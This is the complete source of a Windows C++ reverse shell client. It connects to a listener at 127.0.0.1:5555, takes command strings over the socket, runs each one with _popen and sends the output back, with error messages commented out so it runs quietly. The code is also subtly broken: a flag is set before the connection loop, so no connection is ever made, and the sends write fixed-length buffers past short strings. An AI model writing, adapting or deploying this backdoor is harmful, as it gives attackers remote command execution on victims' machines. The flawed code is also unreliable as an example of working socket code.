#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
using namespace std;

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "5555"
#define DEFAULT_IP "127.0.0.1"

string exec(const char* cmd) {
    std::array<char, DEFAULT_BUFLEN> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int __cdecl main()
{
    cout << "Starting" << endl;
    string conMsg = "?connect";
    const char* argv = DEFAULT_IP;
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    bool quit = false;
    bool found = false;

    // Validate the parameters
    /*if (argc != 2) {
        printf("usage: %s server-name\n", argv[0]);
        return 1;
    }*/

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    found = true;
    while (found == false) {
        // Attempt to connect to an address until one succeeds
        for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

            // Create a SOCKET for connecting to server
            ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                ptr->ai_protocol);
            if (ConnectSocket == INVALID_SOCKET) {
                //printf("socket failed with error: %ld\n", WSAGetLastError());
                WSACleanup();
                return 1;
            }

            // Connect to server.
            iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
            if (iResult == SOCKET_ERROR) {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                continue;
            }
            found = true;
            break;
        }
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        //printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, conMsg.c_str(), recvbuflen, 0);
    if (iResult == SOCKET_ERROR) {
        //printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    //printf("Bytes Sent: %ld\n", iResult);


    // Receive until the peer closes the connection
    while (quit != true) {
        do {
            char buffer[DEFAULT_BUFLEN];
            string msg;
            string res;
            iResult = recv(ConnectSocket, &buffer[0], sizeof(buffer), 0);
            if (iResult > 0) {
                //printf("Bytes received: %d\n", iResult);
                msg = buffer;
                //cout << "Command recieved: " << msg << endl;
            }
            else if (iResult == 0) {
                //printf("Connection closed\n");
                closesocket(ConnectSocket);
                WSACleanup();
                return 0;
            }
            else {
                //printf("recv failed with error: %d\n", WSAGetLastError());
                closesocket(ConnectSocket);
                WSACleanup();
                return 0;
            }
            if (msg[0] == '?') {
                if (msg == "?false") {
                    //cout << "Connection terminated.\n";
                    closesocket(ConnectSocket);
                    WSACleanup();
                    quit = true;
                    return 0;
                }
                res = "?true";
            }
            else {
                res = exec(buffer);
            }
            //res = exec(buffer);
            iResult = send(ConnectSocket, res.c_str(), DEFAULT_BUFLEN, 0);
            if (iResult == SOCKET_ERROR) {
                //printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ConnectSocket);
                WSACleanup();
                return 1;
            }

            //printf("Bytes Sent: %ld\n", iResult);
        } while (iResult > 0);
    }
    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        //printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }
    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
